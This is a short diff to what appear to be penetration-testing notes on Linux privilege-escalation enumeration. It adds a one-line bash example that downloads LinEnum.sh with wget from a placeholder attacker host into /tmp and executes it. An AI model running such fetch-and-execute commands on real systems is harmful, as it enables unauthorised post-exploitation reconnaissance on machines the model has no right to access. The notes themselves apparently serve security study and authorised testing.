@@ -16,3 +16,8 @@
 
 
 PROTIP: Automated enumeration scripts might give false positives or false negatives, so don't always rely exclusively on the presented results from the scripts.
+
+Example LinEnum execution script
+
+    #!/bin/bash
+    wget -q http://<your-ip>/LinEnum.sh -O /tmp/le.sh && bash /tmp/le.sh
